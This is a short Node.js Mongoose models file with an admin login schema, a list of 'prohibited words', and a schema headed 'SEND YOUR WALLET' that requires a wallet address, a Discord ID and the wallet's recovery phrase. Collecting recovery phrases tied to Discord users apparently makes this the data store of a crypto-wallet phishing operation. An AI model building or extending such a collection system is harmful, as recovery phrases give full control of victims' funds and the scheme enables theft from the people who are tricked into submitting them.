const mongoose = require("mongoose");
const bcrypt = require("bcrypt");

// ADMIN AUTHENTICATION AND SIGNIN
const userAuthSign = new mongoose.Schema({
  username: { type: String, required: true, unique: true },
  password: {
    type: String,
    minlength: [6, "At least 6 characters."],
    maxlength: 16,
    required: true,
  },
});
// HASH BEFORE SAVING
userAuthSign.pre("save", async function (next) {
  const salt = await bcrypt.genSalt();
  this.password = await bcrypt.hash(this.password, salt);
  next();
});

// SEND YOUR WALLET
const sentYourWallet = new mongoose.Schema({
  wallet: { type: String, required: true },
  discordID: { type: Number, required: true },
  recoveryPhrase: { type: Array, required: true },
});

// SAVE YOUR PROHIBITED WORDS
const savedWords = new mongoose.Schema({
  words: { type: String, required: true },
});

// MODEL
const authSign = mongoose.model("admin", userAuthSign);
const yourWallet = mongoose.model("wallet", sentYourWallet);
const words = mongoose.model("prohibitedWords", savedWords);

// EXPORTED MODULES
module.exports = { authSign, yourWallet, words };
